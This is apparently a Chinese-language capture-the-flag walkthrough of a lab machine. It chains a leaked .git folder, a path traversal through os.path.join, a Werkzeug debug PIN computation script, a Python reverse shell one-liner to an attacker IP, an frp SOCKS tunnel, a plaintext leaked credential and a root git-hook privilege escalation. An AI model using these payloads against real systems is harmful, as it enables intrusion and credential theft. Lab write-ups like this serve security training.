nmap 扫描结果

![](https://img.mi3aka.eu.org/2022/08/b36baa0648caea64799f384ea0d0fcf6.png)

---

在`download`处可以下载到源代码,发现其存在`.git`文件夹

![](https://img.mi3aka.eu.org/2022/08/5ea81d832712f5e20a0b191884eafe9c.png)

存在两个分支`dev`和`public`

通过比较分支,发现`app/.vscode/setting.json`

```json
{
  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
  "http.proxyStrictSSL": false
}
```

分析源代码`view.py`和`utils.py`

```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```

```python
import time


def current_milli_time():
    return round(time.time() * 1000)


"""
Pass filename and return a secure version, which can then safely be stored on a regular file system.
"""


def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")


def get_unique_upload_name(unsafe_filename):
    spl = unsafe_filename.rsplit("\\.", 1)
    file_name = spl[0]
    file_extension = spl[1]
    return recursive_replace(file_name, "../", "") + "_" + str(current_milli_time()) + "." + file_extension


"""
Recursively replace a pattern in a string
"""


def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
```

在`send_report`函数中,虽然对`../`进行了过滤,但是由于`os.path.join`的存在,可以进行目录遍历和任意文件读取

当`os.path.join`调用遇到绝对路径时,它会忽略在该点之前遇到的所有参数并开始使用新的绝对路径,当参数可控时,我们控制恶意参数输入绝对路径,可能产生目录遍历

![](https://img.mi3aka.eu.org/2022/08/11601daae01c3f08391f0736a60ea38c.png)

![](https://img.mi3aka.eu.org/2022/08/285168606408c0e9830c619b1aaa5dec.png)

发现其开启了flask的debug模式,利用任意文件读取可以对flask的pin码进行破解

![](https://img.mi3aka.eu.org/2022/08/ea18124a6ac4a403efc58be408cf2da4.png)

---

Flask pin码破解

[https://raw.githubusercontent.com/wdahlenburg/werkzeug-debug-console-bypass/main/werkzeug-pin-bypass.py](https://raw.githubusercontent.com/wdahlenburg/werkzeug-debug-console-bypass/main/werkzeug-pin-bypass.py)

```python
#!/bin/python3
import hashlib
from itertools import chain

probably_public_bits = [
	'root',# username
	'flask.app',# modname
	'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
	'/usr/local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
	'2485377892354',# str(uuid.getnode()),  /sys/class/net/ens33/address /sys/class/net/eth0/address 将16进制转换成10进制
	# Machine Id: /etc/machine-id(部分linux系统可能没有,直接忽略即可) + /proc/sys/kernel/random/boot_id + /proc/self/cgroup
	'1222106c-51fc-4deb-bc76-3a0e8123ecd75e5fb2cb3c55faf7ef369518259de66b251fa02647e1dca9db0b943d6f8c4235'
]

h = hashlib.sha1() # Newer versions of Werkzeug use SHA1 instead of MD5
for bit in chain(probably_public_bits, private_bits):
	if not bit:
		continue
	if isinstance(bit, str):
		bit = bit.encode('utf-8')
	h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
	h.update(b'pinsalt')
	num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
						  for x in range(0, len(num), group_size))
			break
	else:
		rv = num

print("Pin: " + rv)
```

![](https://img.mi3aka.eu.org/2022/08/e86e4c31737f6e86c8b9c27b0bf2378a.png)

![](https://img.mi3aka.eu.org/2022/08/5ea7624176737471f993bd692e125e33.png)

![](https://img.mi3aka.eu.org/2022/08/84b3b9ba281177dfa8f9af7570053eb6.png)

![](https://img.mi3aka.eu.org/2022/08/a1654190024f8f40aab18171cb197f41.png)

```python
import os,pty,socket;s=socket.socket();s.connect(("10.10.16.8",7000));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
```

![](https://img.mi3aka.eu.org/2022/08/13c7ab4d5ed956350a653ef8f5f8a406.png)

---

构建frp

```ini
[common]
server_addr = 10.10.16.8
server_port = 7777

[s5]
type = tcp
plugin = socks5
remote_port = 6000
```

发现在[http://172.17.0.1:3000/](http://172.17.0.1:3000/)存在一个Gitea页面

![](https://img.mi3aka.eu.org/2022/08/c1e66cf482ee5432cd24fd8dc4008f14.png)

利用`dev01:Soulless_Developer#2022`进行登录

![](https://img.mi3aka.eu.org/2022/08/37c13a77a75ebbbff44970c6e283f363.png)

在`home-backup/.ssh/id_rsa`中得到一个ssh私钥

![](https://img.mi3aka.eu.org/2022/08/71168114fd171378598be76de25a3bd7.png)

![](https://img.mi3aka.eu.org/2022/08/fe304c5b7795ea990d0968ecf611ccbc.png)

---

提权

![](https://img.mi3aka.eu.org/2022/08/40a357c431387230ba772a9852462526.png)

直接提权不行,用`find / -user root -perm -4000 -print 2>/dev/null`也没找到可以利用的点

上个`pspy`看进程监控

```
2022/08/27 06:53:01 CMD: UID=0    PID=5168   | /bin/sh -c /usr/local/bin/git-sync 
2022/08/27 06:53:01 CMD: UID=0    PID=5167   | /bin/sh -c /usr/local/bin/git-sync 
2022/08/27 06:53:01 CMD: UID=0    PID=5166   | /usr/sbin/CRON -f 
2022/08/27 06:53:01 CMD: UID=0    PID=5169   | git status --porcelain 
2022/08/27 06:53:01 CMD: UID=???  PID=5171   | ???
2022/08/27 06:53:01 CMD: UID=0    PID=5172   | git commit -m Backup for 2022-08-27 
2022/08/27 06:53:01 CMD: UID=0    PID=5173   | git push origin main 
2022/08/27 06:53:01 CMD: UID=0    PID=5174   | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
2022/08/27 06:54:01 CMD: UID=0    PID=5182   | /bin/sh -c /root/meta/app/clean.sh 
2022/08/27 06:54:01 CMD: UID=0    PID=5181   | /bin/sh -c cp /root/config /home/dev01/.git/config 
2022/08/27 06:54:01 CMD: UID=0    PID=5180   | /usr/sbin/CRON -f 
2022/08/27 06:54:01 CMD: UID=0    PID=5179   | /usr/sbin/CRON -f 
2022/08/27 06:54:01 CMD: UID=0    PID=5178   | /usr/sbin/CRON -f 
2022/08/27 06:54:01 CMD: UID=0    PID=5177   | /usr/sbin/CRON -f 
2022/08/27 06:54:01 CMD: UID=0    PID=5183   | /bin/bash /root/meta/app/clean.sh 
2022/08/27 06:54:01 CMD: UID=0    PID=5184   | /bin/sh -c /usr/local/bin/git-sync 
2022/08/27 06:54:01 CMD: UID=0    PID=5187   | /bin/bash /root/meta/app/clean.sh 
2022/08/27 06:54:01 CMD: UID=0    PID=5186   | git status --porcelain 
2022/08/27 06:54:01 CMD: UID=0    PID=5189   | /bin/bash /root/meta/app/clean.sh 
2022/08/27 06:54:01 CMD: UID=0    PID=5188   | /bin/bash /root/meta/app/clean.sh 
2022/08/27 06:54:01 CMD: UID=0    PID=5190   | date +%Y-%m-%d 
2022/08/27 06:54:01 CMD: UID=0    PID=5191   | /bin/bash /usr/local/bin/git-sync 
2022/08/27 06:54:01 CMD: UID=0    PID=5192   | /bin/bash /usr/local/bin/git-sync 
2022/08/27 06:54:01 CMD: UID=0    PID=5193   | git push origin main 
2022/08/27 06:54:01 CMD: UID=0    PID=5199   | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
2022/08/27 06:54:01 CMD: UID=0    PID=5221   | /lib/systemd/systemd-udevd 
```

以`root`权限运行`/usr/local/bin/git-sync`

```bash
#!/bin/bash

cd /home/dev01/

if ! git status --porcelain; then
    echo "No changes"
else
    day=$(date +'%Y-%m-%d')
    echo "Changes detected, pushing.."
    git add .
    git commit -m "Backup for ${day}"
    git push origin main
fi
```

利用`git hooks`以`root`身份进行命令执行

[手写 git hooks 脚本（pre-commit、commit-msg）](https://segmentfault.com/a/1190000040370691)

>记得给`pre-commit`加权限

![](https://img.mi3aka.eu.org/2022/08/2b4cae2e8f346c3b4efcfcaa461901fa.png)

![](https://img.mi3aka.eu.org/2022/08/608ffcb53b5e6347839ebbb9a0d731b8.png)